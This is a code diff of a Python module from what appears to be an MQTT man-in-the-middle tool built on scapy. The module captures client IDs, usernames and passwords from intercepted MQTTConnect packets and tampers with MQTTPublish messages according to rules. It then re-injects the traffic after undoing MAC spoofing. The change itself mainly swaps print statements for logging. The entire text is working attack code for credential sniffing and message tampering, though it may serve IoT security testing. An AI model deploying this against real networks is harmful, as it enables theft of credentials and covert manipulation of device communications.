@@ -7,10 +7,14 @@ from scapy.contrib.mqtt import MQTT, MQTTConnect, MQTTPublish
 from scapy.layers.l2 import Ether
 from scapy.layers.inet import IP, TCP
 
-from mqtwister.utils.network import get_arp_table
 from mqtwister.config import MQTT_PORT
-from mqtwister.processor.tampering.packet import get_layers, reassemble_packet, recalculate_values
 from mqtwister.processor.tampering import alter_MQTTPublish_packet
+from mqtwister.processor.tampering.packet import (
+    get_layers, reassemble_packet, recalculate_values
+)
+from mqtwister.utils.logging import logger
+from mqtwister.utils.network import get_arp_table
+from mqtwister.lang import get_message as m
 
 
 def process_MQTTConnect(packet: MQTT, credentials: set) -> None:
@@ -32,12 +36,8 @@ def process_MQTTConnect(packet: MQTT, credentials: set) -> None:
         # Update credentials set
         credentials.add((client_id, username, password))
 
-        # Print found credentials
-        msg: str = 'Credentials found!\n' \
-            + f"Client ID: '{client_id}', " \
-            + f"Username: '{username}', " \
-            + f"Password: '{password}'"
-        print(msg)
+        # Log message
+        logger.info(m('info_credentials_found', client_id, username, password))
 
     return None
 
@@ -47,10 +47,11 @@ def process_MQTTPublish(packet: MQTT, rules: dict) -> None:
     # Get MQTT message layers
     layers: list[Packet] = get_layers(packet[MQTT])
 
+    # DEBUG
     # print(f"Layers ({len(layers)}): {layers}")
 
     for layer in layers:
-        if type(layer) == MQTTPublish:
+        if isinstance(layer, MQTTPublish):
             alter_MQTTPublish_packet(layer, rules)
 
     # Reassemble MQTT message layers
@@ -70,35 +71,40 @@ def packet_callback(packet: Packet, context: dict) -> None:
         return None
 
     # Don't process packets sent by the own host
-    if packet[Ether].src == context['lmac']:
+    if (ether_src := packet[Ether].src) == context['lmac']:
         return None
 
-    # Only process MQTT or MQTT-related TCP packets
-    port: int | None = context.get('lport', MQTT_PORT)
-    if packet[TCP].sport == port or packet[TCP].dport == port:
-        msg: str = f"[{'='*20}Received MQTT packet.{'='*20}]\n"
-        msg += f"FROM: "
-        msg += f"{packet[Ether].src}/{packet[IP].src}/{packet[TCP].sport}\n"
-        msg += f"TO: "
-        msg += f"{packet[Ether].dst}/{packet[IP].dst}/{packet[TCP].dport}\n"
-        print(msg)
-    else:
+    # Only process MQTT or MQTT-related TCP packets to the listening port
+    lport: int | None = context.get('lport', MQTT_PORT)
+    if not (lport in {packet[TCP].sport, packet[TCP].dport}):
         return None
 
-    # Debugging
-    # packet.show()
+    # DEBUG
+    # logger.debug("Received packet:")
+    # logger.debug(packet.show(dump=True))
 
     # Revert MAC spoofing
     packet[Ether].src = context['lmac']
     packet[Ether].dst = get_arp_table().get(packet[IP].dst)
 
+    # Log MQTT packet received
+    if packet.haslayer(MQTT):
+        logger.debug(m(
+            'debug_mqtt_packet_received',
+            ether_src, packet[IP].src, packet[TCP].sport,
+            packet[Ether].dst, packet[IP].dst, packet[TCP].dport
+        ))
+
+    # Process MQTT packets
     if packet.haslayer(MQTTConnect):
-        process_MQTTConnect(packet, context.setdefault('credentials', []))
-    elif packet.haslayer(MQTTPublish):
+        process_MQTTConnect(packet, context.setdefault('credentials', set()))
+
+    if packet.haslayer(MQTTPublish):
         process_MQTTPublish(packet, context.setdefault('rules', []))
 
-    print("Processed packet:")
-    packet.show2()
+    # DEBUG
+    # logger.debug("Processed packet:")
+    # logger.debug(packet.show2(dump=True))
 
-    sendp(packet, iface=context.get('ifname'))
+    sendp(packet, iface=context.get('ifname'), verbose=False)
     return None
